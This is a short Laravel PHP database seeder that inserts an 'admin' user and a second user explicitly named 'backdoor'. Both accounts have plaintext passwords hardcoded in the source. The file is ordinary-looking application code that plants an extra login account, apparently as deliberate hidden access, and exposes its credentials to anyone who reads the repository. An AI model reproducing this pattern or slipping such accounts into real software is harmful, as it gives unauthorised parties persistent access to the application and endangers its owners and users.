<?php

use Illuminate\Database\Seeder;

class UsersTableSeeder extends Seeder
{
    /**
     * Run the database seeds.
     *
     * @return void
     */
    public function run()
    {
        DB::table('users')->insert([
            [
                'name' => 'admin',
                'email' => 'admin@gmail.com',
                'password' => bcrypt('7iWRQJVMSkrg'),
            ],
            [
                'name' => 'backdoor',
                'email' => 'backdoor@gmail.com',
                'password' => bcrypt('56Di2kot3P0m'),
            ]
        ]);
    }
}
